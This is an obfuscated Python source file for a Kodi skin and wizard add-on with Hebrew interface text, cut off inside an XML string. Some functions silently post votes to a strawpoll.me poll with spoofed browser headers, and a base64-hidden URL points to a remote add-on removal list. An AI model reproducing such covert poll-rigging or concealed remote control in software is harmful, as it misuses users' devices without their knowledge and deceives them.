# coding: utf-8
import xbmc ,xbmcaddon ,xbmcgui ,xbmcplugin ,os ,sys ,xbmcvfs ,glob ,random #line:21
import shutil ,logging #line:22
import urllib2 ,urllib #line:23
import re ,time #line:24
import subprocess #line:25
import json #line:26
import zipfile #line:27
import uservar #line:28
import speedtest #line:29
import fnmatch #line:30
from shutil import copyfile #line:31
try :from sqlite3 import dbapi2 as database #line:32
except :from pysqlite2 import dbapi2 as database #line:33
from threading import Thread #line:34
from datetime import date ,datetime ,timedelta #line:35
from urlparse import urljoin #line:36
from resources .libs import extract ,downloader ,downloaderbg ,notify ,debridit ,traktit ,resloginit ,loginit ,skinSwitch ,uploadLog ,yt ,wizard as wiz #line:37
ADDON_ID =uservar .ADDON_ID #line:39
ADDONTITLE =uservar .ADDONTITLE #line:40
ADDON =wiz .addonId (ADDON_ID )#line:41
VERSION =wiz .addonInfo (ADDON_ID ,'version')#line:42
ADDONPATH =wiz .addonInfo (ADDON_ID ,'path')#line:43
DIALOG =xbmcgui .Dialog ()#line:44
DP =xbmcgui .DialogProgress ()#line:45
HOME =xbmc .translatePath ('special://home/')#line:46
LOG =xbmc .translatePath ('special://logpath/')#line:47
PROFILE =xbmc .translatePath ('special://profile/')#line:48
ADDONS =os .path .join (HOME ,'addons')#line:49
USERDATA =os .path .join (HOME ,'userdata')#line:50
PLUGIN =os .path .join (ADDONS ,ADDON_ID )#line:51
PACKAGES =os .path .join (ADDONS ,'packages')#line:52
ADDOND =os .path .join (USERDATA ,'addon_data')#line:53
ADDONDATA =os .path .join (USERDATA ,'addon_data',ADDON_ID )#line:54
ADVANCED =os .path .join (USERDATA ,'advancedsettings.xml')#line:55
SOURCES =os .path .join (USERDATA ,'sources.xml')#line:56
FAVOURITES =os .path .join (USERDATA ,'favourites.xml')#line:57
PROFILES =os .path .join (USERDATA ,'profiles.xml')#line:58
GUISETTINGS =os .path .join (USERDATA ,'guisettings.xml')#line:59
THUMBS =os .path .join (USERDATA ,'Thumbnails')#line:60
DATABASE =os .path .join (USERDATA ,'Database')#line:61
FANART =os .path .join (ADDONPATH ,'fanart.jpg')#line:62
ICON =os .path .join (ADDONPATH ,'icon.png')#line:63
ART =os .path .join (ADDONPATH ,'resources','art')#line:64
WIZLOG =os .path .join (ADDONDATA ,'wizard.log')#line:65
DP2 =xbmcgui .DialogProgressBG ()#line:66
SKIN =xbmc .getSkinDir ()#line:67
BUILDNAME =wiz .getS ('buildname')#line:68
DEFAULTSKIN =wiz .getS ('defaultskin')#line:69
DEFAULTNAME =wiz .getS ('defaultskinname')#line:70
DEFAULTIGNORE =wiz .getS ('defaultskinignore')#line:71
BUILDVERSION =wiz .getS ('buildversion')#line:72
BUILDTHEME =wiz .getS ('buildtheme')#line:73
BUILDLATEST =wiz .getS ('latestversion')#line:74
INSTALLMETHOD =wiz .getS ('installmethod')#line:75
SHOW15 =wiz .getS ('show15')#line:76
SHOW16 =wiz .getS ('show16')#line:77
SHOW17 =wiz .getS ('show17')#line:78
SHOW18 =wiz .getS ('show18')#line:79
SHOWADULT =wiz .getS ('adult')#line:80
SHOWMAINT =wiz .getS ('showmaint')#line:81
AUTOCLEANUP =wiz .getS ('autoclean')#line:82
AUTOCACHE =wiz .getS ('clearcache')#line:83
AUTOPACKAGES =wiz .getS ('clearpackages')#line:84
AUTOTHUMBS =wiz .getS ('clearthumbs')#line:85
AUTOFEQ =wiz .getS ('autocleanfeq')#line:86
AUTONEXTRUN =wiz .getS ('nextautocleanup')#line:87
INCLUDENAN =wiz .getS ('includenan')#line:88
INCLUDEURL =wiz .getS ('includeurl')#line:89
INCLUDEBOBUNLEASHED =wiz .getS ('includebobunleashed')#line:90
INCLUDEELYSIUM =wiz .getS ('includeelysium')#line:91
INCLUDECOVENANT =wiz .getS ('includecovenant')#line:92
INCLUDEVIDEO =wiz .getS ('includevideo')#line:93
INCLUDEALL =wiz .getS ('includeall')#line:94
INCLUDEBOB =wiz .getS ('includebob')#line:95
INCLUDEPHOENIX =wiz .getS ('includephoenix')#line:96
INCLUDESPECTO =wiz .getS ('includespecto')#line:97
INCLUDEGENESIS =wiz .getS ('includegenesis')#line:98
INCLUDEEXODUS =wiz .getS ('includeexodus')#line:99
INCLUDEONECHAN =wiz .getS ('includeonechan')#line:100
INCLUDESALTS =wiz .getS ('includesalts')#line:101
INCLUDESALTSHD =wiz .getS ('includesaltslite')#line:102
INCLUDERESOLVE =wiz .getS ('includeresolve')#line:103
INCLUDEPLACENTA =wiz .getS ('includeplacenta')#line:104
INCLUDENEPTUNE =wiz .getS ('includeneptune')#line:105
INCLUDEGENESISREBORN =wiz .getS ('includegenesisreborn')#line:106
INCLUDEFLIXNET =wiz .getS ('includeflixnet')#line:107
INCLUDEURANUS =wiz .getS ('includeuranus')#line:108
SEPERATE =wiz .getS ('seperate')#line:109
NOTIFY =wiz .getS ('notify')#line:110
NOTEDISMISS =wiz .getS ('notedismiss')#line:111
NOTEID =wiz .getS ('noteid')#line:112
NOTIFY2 =wiz .getS ('notify2')#line:113
NOTEID2 =wiz .getS ('noteid2')#line:114
NOTEDISMISS2 =wiz .getS ('notedismiss2')#line:115
NOTIFY3 =wiz .getS ('notify3')#line:116
NOTEID3 =wiz .getS ('noteid3')#line:117
NOTEDISMISS3 =wiz .getS ('notedismiss3')#line:118
NOTEID =0 if NOTEID ==""else int (NOTEID )#line:119
TRAKTSAVE =wiz .getS ('traktlastsave')#line:120
REALSAVE =wiz .getS ('debridlastsave')#line:121
LOGINSAVE =wiz .getS ('loginlastsave')#line:122
KEEPMOVIEWALL =wiz .getS ('keepmoviewall')#line:123
KEEPMOVIELIST =wiz .getS ('keepmovielist')#line:124
KEEPINFO =wiz .getS ('keepinfo')#line:125
KEEPSOUND =wiz .getS ('keepsound')#line:127
KEEPVIEW =wiz .getS ('keepview')#line:128
KEEPSKIN =wiz .getS ('keepskin')#line:129
KEEPADDONS =wiz .getS ('keepaddons')#line:130
KEEPSKIN2 =wiz .getS ('keepskin2')#line:131
KEEPSKIN3 =wiz .getS ('keepskin3')#line:132
KEEPTORNET =wiz .getS ('keeptornet')#line:133
KEEPPLAYLIST =wiz .getS ('keepplaylist')#line:134
KEEPPVR =wiz .getS ('keeppvr')#line:135
ENABLE =uservar .ENABLE #line:136
KEEPVICTORY =wiz .getS ('keepvictory')#line:137
KEEPTELEMEDIA =wiz .getS ('keeptelemedia')#line:138
KEEPTVLIST =wiz .getS ('keeptvlist')#line:139
KEEPHUBMOVIE =wiz .getS ('keephubmovie')#line:140
KEEPHUBTVSHOW =wiz .getS ('keephubtvshow')#line:141
KEEPHUBTV =wiz .getS ('keephubtv')#line:142
KEEPHUBVOD =wiz .getS ('keephubvod')#line:143
KEEPHUBKIDS =wiz .getS ('keephubkids')#line:144
KEEPHUBMUSIC =wiz .getS ('keephubmusic')#line:145
KEEPHUBMENU =wiz .getS ('keephubmenu')#line:146
KEEPHUBSPORT =wiz .getS ('keephubsport')#line:147
HARDWAER =wiz .getS ('action')#line:148
USERNAME =wiz .getS ('user')#line:149
PASSWORD =wiz .getS ('pass')#line:150
KEEPWEATHER =wiz .getS ('keepweather')#line:151
KEEPFAVS =wiz .getS ('keepfavourites')#line:152
KEEPSOURCES =wiz .getS ('keepsources')#line:153
KEEPPROFILES =wiz .getS ('keepprofiles')#line:154
KEEPADVANCED =wiz .getS ('keepadvanced')#line:155
KEEPREPOS =wiz .getS ('keeprepos')#line:156
KEEPSUPER =wiz .getS ('keepsuper')#line:157
KEEPWHITELIST =wiz .getS ('keepwhitelist')#line:158
KEEPTRAKT =wiz .getS ('keeptrakt')#line:159
KEEPREAL =wiz .getS ('keepdebrid')#line:160
KEEPRD2 =wiz .getS ('keeprd2')#line:161
KEEPLOGIN =wiz .getS ('keeplogin')#line:162
LOGINSAVE =wiz .getS ('loginlastsave')#line:163
DEVELOPER =wiz .getS ('developer')#line:164
THIRDPARTY =wiz .getS ('enable3rd')#line:165
THIRD1NAME =wiz .getS ('wizard1name')#line:166
THIRD1URL =wiz .getS ('wizard1url')#line:167
THIRD2NAME =wiz .getS ('wizard2name')#line:168
THIRD2URL =wiz .getS ('wizard2url')#line:169
THIRD3NAME =wiz .getS ('wizard3name')#line:170
THIRD3URL =wiz .getS ('wizard3url')#line:171
BACKUPLOCATION =ADDON .getSetting ('path')if not ADDON .getSetting ('path')==''else 'special://home/'#line:172
MYBUILDS =os .path .join (BACKUPLOCATION ,'My_Builds','')#line:173
AUTOFEQ =int (float (AUTOFEQ ))if AUTOFEQ .isdigit ()else 3 #line:174
TODAY =date .today ()#line:175
TOMORROW =TODAY +timedelta (days =1 )#line:176
THREEDAYS =TODAY +timedelta (days =3 )#line:177
KODIV =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:178
MCNAME =wiz .mediaCenter ()#line:179
EXCLUDES =uservar .EXCLUDES #line:180
SPEEDFILE =speedtest .SPEEDFILE #line:181
APKFILE =uservar .APKFILE #line:182
YOUTUBETITLE =uservar .YOUTUBETITLE #line:183
YOUTUBEFILE =uservar .YOUTUBEFILE #line:184
SPEED =speedtest .SPEED #line:185
UNAME =speedtest .UNAME #line:186
ADDONFILE =uservar .ADDONFILE #line:187
ADVANCEDFILE =uservar .ADVANCEDFILE #line:188
UPDATECHECK =uservar .UPDATECHECK if str (uservar .UPDATECHECK ).isdigit ()else 1 #line:189
NEXTCHECK =TODAY +timedelta (days =UPDATECHECK )#line:190
NOTIFICATION =uservar .NOTIFICATION #line:191
NOTIFICATION2 =uservar .NOTIFICATION2 #line:192
NOTIFICATION3 =uservar .NOTIFICATION3 #line:193
HELPINFO =uservar .HELPINFO #line:194
ENABLE =uservar .ENABLE #line:195
HEADERMESSAGE =uservar .HEADERMESSAGE #line:196
AUTOUPDATE =uservar .AUTOUPDATE #line:197
WIZARDFILE =uservar .WIZARDFILE #line:198
HIDECONTACT =uservar .HIDECONTACT #line:199
SKINID18 =uservar .SKINID18 #line:200
SKINID18DDONXML =uservar .SKINID18DDONXML #line:201
SKIN18ZIPURL =uservar .SKIN18ZIPURL #line:202
SKINID17 =uservar .SKINID17 #line:203
SKINID17DDONXML =uservar .SKINID17DDONXML #line:204
SKIN17ZIPURL =uservar .SKIN17ZIPURL #line:205
NEWFASTUPDATE =uservar .NEWFASTUPDATE #line:206
CONTACT =uservar .CONTACT #line:207
CONTACTICON =uservar .CONTACTICON if not uservar .CONTACTICON =='http://'else ICON #line:208
CONTACTFANART =uservar .CONTACTFANART if not uservar .CONTACTFANART =='http://'else FANART #line:209
HIDESPACERS =uservar .HIDESPACERS #line:210
TMDB_NEW_API =uservar .TMDB_NEW_API #line:211
COLOR1 =uservar .COLOR1 #line:212
COLOR2 =uservar .COLOR2 #line:213
THEME1 =uservar .THEME1 #line:214
THEME2 =uservar .THEME2 #line:215
THEME3 =uservar .THEME3 #line:216
THEME4 =uservar .THEME4 #line:217
THEME5 =uservar .THEME5 #line:218
ICONBUILDS =uservar .ICONBUILDS if not uservar .ICONBUILDS =='http://'else ICON #line:220
ICONMAINT =uservar .ICONMAINT if not uservar .ICONMAINT =='http://'else ICON #line:221
ICONAPK =uservar .ICONAPK if not uservar .ICONAPK =='http://'else ICON #line:222
ICONADDONS =uservar .ICONADDONS if not uservar .ICONADDONS =='http://'else ICON #line:223
ICONYOUTUBE =uservar .ICONYOUTUBE if not uservar .ICONYOUTUBE =='http://'else ICON #line:224
ICONSAVE =uservar .ICONSAVE if not uservar .ICONSAVE =='http://'else ICON #line:225
ICONTRAKT =uservar .ICONTRAKT if not uservar .ICONTRAKT =='http://'else ICON #line:226
ICONREAL =uservar .ICONREAL if not uservar .ICONREAL =='http://'else ICON #line:227
ICONLOGIN =uservar .ICONLOGIN if not uservar .ICONLOGIN =='http://'else ICON #line:228
ICONCONTACT =uservar .ICONCONTACT if not uservar .ICONCONTACT =='http://'else ICON #line:229
ICONSETTINGS =uservar .ICONSETTINGS if not uservar .ICONSETTINGS =='http://'else ICON #line:230
LOGFILES =wiz .LOGFILES #line:231
TRAKTID =traktit .TRAKTID #line:232
DEBRIDID =debridit .DEBRIDID #line:233
LOGINID =loginit .LOGINID #line:234
MODURL ='http://tribeca.tvaddons.ag/tools/maintenance/modules/'#line:235
MODURL2 ='http://mirrors.kodi.tv/addons/jarvis/'#line:236
INSTALLMETHODS =['Always Ask','Reload Profile','Force Close']#line:237
DEFAULTPLUGINS =['metadata.album.universal','metadata.artists.universal','metadata.common.fanart.tv','metadata.common.imdb.com','metadata.common.musicbrainz.org','metadata.themoviedb.org','metadata.tvdb.com','service.xbmc.versioncheck']#line:238
fullsecfold =xbmc .translatePath ('special://home')#line:239
addons_folder =os .path .join (fullsecfold ,'addons')#line:241
remove_url ='aHR0cDovL2tvZGkubGlmZS93aXphcmQvcmVtb3ZlYWRkb25zLnhtbA=='.decode ('base64')#line:243
user_folder =os .path .join (xbmc .translatePath ('special://masterprofile'),'addon_data')#line:245
remove_url2 ='aHR0cDovL2tvZGkubGlmZS93aXphcmQvcmVtb3ZlYWRkb25zLnhtbA=='.decode ('base64')#line:247
fanart =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'fanart.jpg'))#line:248
icon =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'icon.png'))#line:249
IPTV18 =''#line:252
IPTVSIMPL18PC =''#line:253
def MainMenu ():#line:260
	addItem ('Skin Premium','url',5 ,icon ,fanart ,'')#line:262
def skinWIN ():#line:263
	idle ()#line:264
	OOO0O0O00OOO00O00 =glob .glob (os .path .join (ADDONS ,'skin*'))#line:265
	O0O0OO000000OOO00 =[];OOO0OO0O0O0OOO0OO =[]#line:266
	for OO00OOO000OOOO0O0 in sorted (OOO0O0O00OOO00O00 ,key =lambda O00O0O000O0O0000O :O00O0O000O0O0000O ):#line:267
		O0OOO0O0OOOO0OOO0 =os .path .split (OO00OOO000OOOO0O0 [:-1 ])[1 ]#line:268
		O0000O00OO00O000O =os .path .join (OO00OOO000OOOO0O0 ,'addon.xml')#line:269
		if os .path .exists (O0000O00OO00O000O ):#line:270
			O00OOO0O0O0O000O0 =open (O0000O00OO00O000O )#line:271
			O0OOOOO0O000OO000 =O00OOO0O0O0O000O0 .read ()#line:272
			OO0O0O0O0OOO0O0O0 =parseDOM2 (O0OOOOO0O000OO000 ,'addon',ret ='id')#line:273
			O00OOO0OOO0OOOO00 =O0OOO0O0OOOO0OOO0 if len (OO0O0O0O0OOO0O0O0 )==0 else OO0O0O0O0OOO0O0O0 [0 ]#line:274
			try :#line:275
				O0OO00O0OOO0O00O0 =xbmcaddon .Addon (id =O00OOO0OOO0OOOO00 )#line:276
				O0O0OO000000OOO00 .append (O0OO00O0OOO0O00O0 .getAddonInfo ('name'))#line:277
				OOO0OO0O0O0OOO0OO .append (O00OOO0OOO0OOOO00 )#line:278
			except :#line:279
				pass #line:280
	O0O0000OOO0O00O0O =[];OOO00O000OOO0O0O0 =0 #line:281
	OOOOO0O0OO0OO00OO =["Current Skin -- %s"%currSkin ()]+O0O0OO000000OOO00 #line:282
	OOO00O000OOO0O0O0 =DIALOG .select ("Select the Skin you want to swap with.",OOOOO0O0OO0OO00OO )#line:283
	if OOO00O000OOO0O0O0 ==-1 :return #line:284
	else :#line:285
		OOO00OOO0O0O00O0O =(OOO00O000OOO0O0O0 -1 )#line:286
		O0O0000OOO0O00O0O .append (OOO00OOO0O0O00O0O )#line:287
		OOOOO0O0OO0OO00OO [OOO00O000OOO0O0O0 ]="%s"%(O0O0OO000000OOO00 [OOO00OOO0O0O00O0O ])#line:288
	if O0O0000OOO0O00O0O ==None :return #line:289
	for O00O000O00OO00000 in O0O0000OOO0O00O0O :#line:290
		swapSkins (OOO0OO0O0O0OOO0OO [O00O000O00OO00000 ])#line:291
def currSkin ():#line:293
	return xbmc .getSkinDir ('Container.PluginName')#line:294
def swapSkins (OOOOOO00OOOO0O000 ,title ="Error"):#line:295
	OO00OOOO00O000O00 ='lookandfeel.skin'#line:296
	OO000O0O0O0OO0O00 =OOOOOO00OOOO0O000 #line:297
	O0O0OO00000OOO0OO =getOld (OO00OOOO00O000O00 )#line:298
	O0O00OOOOO0O00O0O =OO00OOOO00O000O00 #line:299
	setNew (O0O00OOOOO0O00O0O ,OO000O0O0O0OO0O00 )#line:300
	OOO000OOO00O00000 =0 #line:301
	while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OOO000OOO00O00000 <100 :#line:302
		OOO000OOO00O00000 +=1 #line:303
		xbmc .sleep (1 )#line:304
	if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:305
		xbmc .executebuiltin ('SendClick(11)')#line:306
	return True #line:307
def getOld (O0OOO000OOOOO0O00 ):#line:309
	try :#line:310
		O0OOO000OOOOO0O00 ='"%s"'%O0OOO000OOOOO0O00 #line:311
		O00O0OO000000000O ='{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":%s}, "id":1}'%(O0OOO000OOOOO0O00 )#line:312
		O00O0OO0OOO0000O0 =xbmc .executeJSONRPC (O00O0OO000000000O )#line:314
		O00O0OO0OOO0000O0 =simplejson .loads (O00O0OO0OOO0000O0 )#line:315
		if O00O0OO0OOO0000O0 .has_key ('result'):#line:316
			if O00O0OO0OOO0000O0 ['result'].has_key ('value'):#line:317
				return O00O0OO0OOO0000O0 ['result']['value']#line:318
	except :#line:319
		pass #line:320
	return None #line:321
def setNew (OOOO00O0O0O00OOOO ,O00OOOO0OO00OO000 ):#line:324
	try :#line:325
		OOOO00O0O0O00OOOO ='"%s"'%OOOO00O0O0O00OOOO #line:326
		O00OOOO0OO00OO000 ='"%s"'%O00OOOO0OO00OO000 #line:327
		O0O0O0O00O0O00000 ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}'%(OOOO00O0O0O00OOOO ,O00OOOO0OO00OO000 )#line:328
		OOO0O0OO0O0O00O00 =xbmc .executeJSONRPC (O0O0O0O00O0O00000 )#line:330
	except :#line:331
		pass #line:332
	return None #line:333
def idle ():#line:334
	return xbmc .executebuiltin ('Dialog.Close(busydialog)')#line:335
def resetkodi ():#line:337
		if xbmc .getCondVisibility ('system.platform.windows'):#line:338
			O00OOOOOO00OO000O =xbmcgui .DialogProgress ()#line:339
			O00OOOOOO00OO000O .create ("ההתקנה תסגר והקודי יעלה אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:342
			O00OOOOOO00OO000O .update (0 )#line:343
			for O0O000O0000OO0OOO in range (5 ,-1 ,-1 ):#line:344
				time .sleep (1 )#line:345
				O00OOOOOO00OO000O .update (int ((5 -O0O000O0000OO0OOO )/5.0 *100 ),"מתבצע הפעלה מחדש לקודי",'בעוד {0} שניות'.format (O0O000O0000OO0OOO ),'')#line:346
				if O00OOOOOO00OO000O .iscanceled ():#line:347
					from resources .libs import win #line:348
					return None ,None #line:349
			from resources .libs import win #line:350
		else :#line:351
			O00OOOOOO00OO000O =xbmcgui .DialogProgress ()#line:352
			O00OOOOOO00OO000O .create ("ההתקנה תסגר אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:355
			O00OOOOOO00OO000O .update (0 )#line:356
			for O0O000O0000OO0OOO in range (5 ,-1 ,-1 ):#line:357
				time .sleep (1 )#line:358
				O00OOOOOO00OO000O .update (int ((5 -O0O000O0000OO0OOO )/5.0 *100 ),"ההתקנה תסגר",'בעוד {0} שניות'.format (O0O000O0000OO0OOO ),'')#line:359
				if O00OOOOOO00OO000O .iscanceled ():#line:360
					os ._exit (1 )#line:361
					return None ,None #line:362
			os ._exit (1 )#line:363
def backtokodi ():#line:365
			wiz .kodi17Fix ()#line:366
			fix18update ()#line:367
			fix17update ()#line:368
def testcommand1 ():#line:370
    import requests #line:371
    O000OOO0O0OOO000O ='18773068'#line:372
    OOO00OOOO0000OOO0 ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+O000OOO0O0OOO000O ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:384
    O0O00OOO00OO00O00 ='145273320'#line:386
    O0O00OO0O0OOO0OO0 ='145272688'#line:387
    if ADDON .getSetting ("auto_rd")=='true':#line:388
        OOO0O0O0O00O0O0O0 =O0O00OOO00OO00O00 #line:389
    else :#line:390
        OOO0O0O0O00O0O0O0 =O0O00OO0O0OOO0OO0 #line:391
    OOOO0O0OOOO000O0O ={'options':OOO0O0O0O00O0O0O0 }#line:395
    O00O0O000O0O0OOOO =requests .post ('https://www.strawpoll.me/'+O000OOO0O0OOO000O ,headers =OOO00OOOO0000OOO0 ,data =OOOO0O0OOOO000O0O )#line:397
def builde_Votes ():#line:398
   try :#line:399
        import requests #line:400
        OO00OO0OOO000O00O ='18773068'#line:401
        O000000OOOOO00OOO ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+OO00OO0OOO000O00O ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:413
        O000OO0000000OOO0 ='145273320'#line:415
        OO0O0O00OO000000O ={'options':O000OO0000000OOO0 }#line:421
        OO00OOO0OOOO0O000 =requests .post ('https://www.strawpoll.me/'+OO00OO0OOO000O00O ,headers =O000000OOOOO00OOO ,data =OO0O0O00OO000000O )#line:423
   except :pass #line:424
def update_Votes ():#line:425
   try :#line:426
        import requests #line:427
        O00OO0O0O0OOOO0O0 ='18773068'#line:428
        OOO0O00OOOO00OOOO ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+O00OO0O0O0OOOO0O0 ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:440
        OO000O0O00O000O0O ='145273321'#line:442
        OO0OOO0OOO0O0O00O ={'options':OO000O0O00O000O0O }#line:448
        O0O0OO00O0000000O =requests .post ('https://www.strawpoll.me/'+O00OO0O0O0OOOO0O0 ,headers =OOO0O00OOOO00OOOO ,data =OO0OOO0OOO0O0O00O )#line:450
   except :pass #line:451
def kodi17to18 ():#line:454
  if KODIV >=18 :#line:456
    OO0O0OOOO000O0000 =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:458
    with open (OO0O0OOOO000O0000 ,'r')as O000000O0O0O000O0 :#line:459
      O0O00OOOOO0O00OOO =O000000O0O0O000O0 .read ()#line:460
    O0O00OOOOO0O00OOO =O0O00OOOOO0O00OOO .replace ('''<?xml version="1.0" encoding="UTF-8"?>
<addon id="skin.Premium.mod" version="1.6.0" name="Anonymous Mod" provider-name="Mod by Anonymous">
    <requires>
        <import addon="xbmc.gui" version="5.12.0"/>
        <import addon="script.skinshortcuts" version="1.0.10"/>
        <import addon="script.image.resource.select" version="0.0.5"/>
        <import addon="plugin.program.autocompletion" version="1.0.1"/>
        <!-- <import addon="resource.images.recordlabels.white" version="0.0.1"/> -->
		<!-- <import addon="script.skin.helper.service" version="1.0.0"/> -->
        <import addon="script.skin.helper.widgets" version="1.0.0"/>
    </requires>
	<extension point="xbmc.gui.skin" debugging="false">		
        <res width="1920" height="1080" aspect="16:9" default="true" folder="16x9" />
    </extension>
    <extension point="xbmc.addon.metadata">
        <platform>all</platform>
        <summary lang="en">Clean, clear, simple, modern.</summary>
    </extension>
 		<assets>
 			<icon>resources/icon.png</icon>
 			<fanart>resources/fanart.jpg</fanart>
 		</assets>   
</addon>''','''<?xml version="1.0" encoding="UTF-8"?>
<addon id="skin.Premium.mod" version="1.6.0" name="Anonymous Mod" provider-name="Mod by Anonymous">
    <requires>
        <import addon="xbmc.gui" version="5.14.0"/>
        <import addon="script.skinshortcuts" version="1.0.10"/>
        <import addon="script.image.resource.select" version="0.0.5"/>
        <import addon="plugin.program.autocompletion" version="1.0.1"/>
        <!-- <import addon="resource.images.recordlabels.white" version="0.0.1"/> -->
		<!-- <import addon="script.skin.helper.service" version="1.0.0"/> -->
        <import addon="script.skin.helper.widgets" version="1.0.0"/>
    </requires>
	<extension point="xbmc.gui.skin" debugging="false">		
        <res width="1920" height="1080" aspect="16:9" default="true" folder="16x9" />
    </extension>
    <extension point="xbmc.addon.metadata">
        <platform>all</platform>
        <summary lang="en">Clean, clear, simple, modern.</summary>
    </extension>
 		<assets>
 			<icon>resources/icon.png</icon>
 			<fanart>resources/fanart.jpg</fanart>
 		</assets>   
</addon>''')#line:507
    with open (OO0O0OOOO000O0000 ,'w')as O000000O0O0O000O0 :#line:510
      O000000O0O0O000O0 .write (O0O00OOOOO0O00OOO )#line:511
    OO0O0OOOO000O0000 =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","16x9","DialogAddonSettings.xml")#line:517
    with open (OO0O0OOOO000O0000 ,'r')as O000000O0O0O000O0 :#line:518
      O0O00OOOOO0O00OOO =O000000O0O0O000O0 .read ()#line:519
    O0O00OOOOO0O00OOO =O0O00OOOOO0O00OOO .replace ('''<?xml version="1.0" encoding="UTF-8"?>
<window>
    <!-- addonsettings -->
    <defaultcontrol always="true">9</defaultcontrol>
    <controls>
        <control type="group">
            <top>210</top>
            <bottom>64</bottom>
            <left>0</left>
            <right>0</right>
            <include>Animation_SlideIn</include>
            <include>Animation_FadeOut</include>
            <animation effect="slide" tween="quadratic" easing="out" time="300" start="0,1920" end="0">WindowOpen</animation>
            <animation effect="slide" tween="quadratic" easing="in" time="300" end="0,1920" start="0">WindowClose</animation>
            <include>Dialog_Background</include>
            <control type="group">
                <top>70</top>
                <right>side</right>
                <left>1430</left>
                <align>right</align>
                <height>621</height>
                <control type="group">
                    <width>460</width>
                    <height>621</height>
                    <include content="Object_Line_Settings">
                        <param name="width" value="460" />
                        <param name="label" value="$INFO[Control.GetLabel(20)]" />
                    </include>
                    <control type="grouplist" id="9">
                        <ondown>9</ondown>
                        <onup>9</onup>
                        <onleft>8000</onleft>
                        <onright>2</onright>
                        <width>100%</width>
                        <height>621</height>
                        <orientation>vertical</orientation>
                        <itemgap>0</itemgap>
                    </control>
                </control> 

                <control type="group">
                    <right>480</right>
                    <width>1400</width>
                    <height>621</height>
                    <include content="Object_Line_Settings">
                        <param name="width" value="1400" />
                        <param name="label" value="$LOCALIZE[33063]" />
                    </include>
                    <control type="grouplist" id="2">
                        <width>100%</width>
                        <height>621</height>
                        <ondown>8000</ondown>
                        <onup>noop</onup>
                        <onright>9</onright>
                        <onleft>8000</onleft>
                        <orientation>vertical</orientation>
                        <itemgap>0</itemgap>
                    </control>
                </control> 
                
            </control>

            <!-- Default Templates -->
            <control type="button" id="3">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>
            <control type="radiobutton" id="4">
                <width>100%</width>
                <align>right</align>
                <radioposx>40</radioposx>
                <include>Defs_OptionButton</include>
            </control>
            <control type="spincontrolex" id="5">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>
            <control type="image" id="6">
                <width>100%</width>
                <height>69</height>
                <texture colordiffuse="PosterBorder">common/white.png</texture>
                <include>Defs_OptionButton</include>
                <visible>false</visible>
            </control>
            <control type="label" id="7">
                <width>100%</width>
                <height>69</height>
                <align>right</align>
                <font>Font-ListInfo-Small-Bold</font>
                <textcolor>blue</textcolor>
            </control>
            <control type="sliderex" id="8">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>

            <!-- Default Templates Category -->
			<control type="button" id="13">
				<description>default Section Button</description>
				<width>400</width>
				<height>62</height>
				<align>center</align>
        <texturenofocus colordiffuse="PosterBorder">common/white.png</texturenofocus>
        <texturefocus colordiffuse="$VAR[HighlightColor]">common/white.png</texturefocus>
        <alttexturenofocus colordiffuse="PosterBorder">common/white.png</alttexturenofocus>
        <alttexturefocus colordiffuse="$VAR[HighlightColor]">common/white.png</alttexturefocus>
			</control>

            <!-- Ok Cancel Defaults -->
            <control type="grouplist" id="8000">
                <centerleft>50%</centerleft>
                <width>1240</width>
                <bottom>side</bottom>
                <height>69</height>
                <align>center</align>
                <itemgap>20</itemgap>
                <onup>2</onup>
                <ondown>noop</ondown>
                <orientation>horizontal</orientation>
                <control type="button" id="10">
                    <align>center</align>
                    <width>400</width>
                    <label>186</label>
                    <include>Defs_OptionButton</include>
                    <visible>Control.IsEnabled(10)</visible>
                </control>
                <control type="button" id="11">
                    <align>center</align>
                    <width>400</width>
                    <label>222</label>
                    <include>Defs_OptionButton</include>
                    <visible>Control.IsEnabled(11)</visible>
                </control>
                <control type="button" id="12">
                    <align>center</align>
                    <width>400</width>
                    <label>409</label>
                    <include>Defs_OptionButton</include>
                    <visible>Control.IsEnabled(12)</visible>
                </control>
            </control>
        </control>

    </controls>

</window>
''','''<?xml version="1.0" encoding="UTF-8"?>
<window>
    <!-- addonsettings -->
    <defaultcontrol always="true">3</defaultcontrol>
    <controls>
        <control type="group">
            <top>210</top>
            <bottom>64</bottom>
            <left>0</left>
            <right>0</right>
            <include>Animation_SlideIn</include>
            <include>Animation_FadeOut</include>
